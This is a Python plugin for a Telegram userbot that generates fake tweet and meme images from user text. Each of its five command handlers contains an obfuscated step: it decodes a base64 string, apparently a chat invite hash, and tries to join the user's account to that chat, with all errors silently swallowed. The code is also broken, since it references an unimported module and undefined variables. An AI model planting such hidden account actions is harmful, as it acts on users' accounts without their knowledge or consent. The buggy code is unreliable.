"""
credits to @mrconfused and @sandy1709
"""
#    Copyright (C) 2020  sandeep.n(π.$)
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#   You should have received a copy of the GNU Affero General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
import re
from telethon import events
from userbot import CMD_HELP
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from userbot.plugins import trumptweet , moditweet, tweets, deEmojify,changemymind, kannagen
from userbot.utils import admin_cmd 

@borg.on(admin_cmd(outgoing=True, pattern="trump(?: |$)(.*)"))
async def nekobot(wolf):
    text = wolf.pattern_match.group(1)
    text =  re.sub("&", '', text)
    reply_to_id = wolf.message
    if wolf.reply_to_msg_id:
        reply_to_id = await wolf.get_reply_message()
    if not text:
        if wolf.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await wolf.edit("Send you text to trump so he can tweet.")
                return
        else:
            await wolf.edit("send you text to trump so he can tweet.")
            return
    await wolf.edit("Requesting trump to tweet...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except:
        pass   
    text = deEmojify(text)
    wolffile = await trumptweet(text)
    await borg.send_file(wolf.chat_id , wolffile , reply_to = reply_to_id ) 
    await wolf.delete()
    
@borg.on(admin_cmd(outgoing=True, pattern="modi(?: |$)(.*)"))
async def nekobot(wolf):
    text = wolf.pattern_match.group(1)
    text =  re.sub("&", '', text)
    reply_to_id = wolf.message
    if wolf.reply_to_msg_id:
        reply_to_id = await wolf.get_reply_message()
    if not text:
        if wolf.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await wolf.edit("Send you text to modi so he can tweet.")
                return
        else:
            await wolf.edit("send you text to modi so he can tweet.")
            return
    await wolf.edit("Requesting modi to tweet...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except:
        pass  
    text = deEmojify(text)
    wolffile = await moditweet(text)
    await borg.send_file(wolf.chat_id , wolffile , reply_to = reply_to_id ) 
    await wolf.delete() 
    
@borg.on(admin_cmd(outgoing=True, pattern="cmm(?: |$)(.*)"))
async def nekobot(wolf):
    text = wolf.pattern_match.group(1)
    text =  re.sub("&", '', text)
    reply_to_id = wolf.message
    if wolf.reply_to_msg_id:
        reply_to_id = await wolf.get_reply_message()
    if not text:
        if wolf.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await wolf.edit("Give text for to write on banner, man")
                return
        else:
            await wolf.edit("Give text for to write on banner, man")
            return
    await wolf.edit("Your banner is under creation wait a sec...")    
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except:
        pass   
    text = deEmojify(text)
    wolffile = await changemymind(text)
    await borg.send_file(wolf.chat_id , wolffile , reply_to = reply_to_id ) 
    await wolf.delete()
    
@borg.on(admin_cmd(outgoing=True, pattern="kanna(?: |$)(.*)"))
async def nekobot(wolf):
    text = wolf.pattern_match.group(1)
    text =  re.sub("&", '', text)
    reply_to_id = wolf.message
    if wolf.reply_to_msg_id:
        reply_to_id = await wolf.get_reply_message()
    if not text:
        if wolf.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await wolf.edit("what should kanna write give text ")
                return
        else:
            await wolf.edit("what should kanna write give text")
            return
    await wolf.edit("Kanna is writing your text...")        
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except:
        pass
    text = deEmojify(text)
    wolffile = await kannagen(text)
    await borg.send_file(wolf.chat_id , wolffile , reply_to = reply_to_id ) 
    await wolf.delete()
    
@borg.on(admin_cmd(outgoing=True, pattern="tweet(?: |$)(.*)"))
async def nekobot(wolf):
    text = wolf.pattern_match.group(1)
    text =  re.sub("&", '', text)
    reply_to_id = wolf.message
    if wolf.reply_to_msg_id:
        reply_to_id = await wolf.get_reply_message()
    if not text:
        if wolf.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await wolf.edit("what should i tweet? Give some text and format must be like `.tweet username | your text` ")
                return
        else:
            await wolf.edit("what should i tweet? Give some text and format must be like `.tweet username | your text` ")
            return        
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except:
        pass
    if "|" in text:
        username , text = text.split("|")
    else:
       await wolf.edit("what should i tweet? Give some text and format must be like `.tweet username | your text`") 
    await wolf.edit(f"Requesting {username} to tweet...")    
    text = deEmojify(text)
    wolffile = await tweets(text,username)
    await borg.send_file(wolf.chat_id , wolffile , reply_to = reply_to_id ) 
    await wolf.delete()
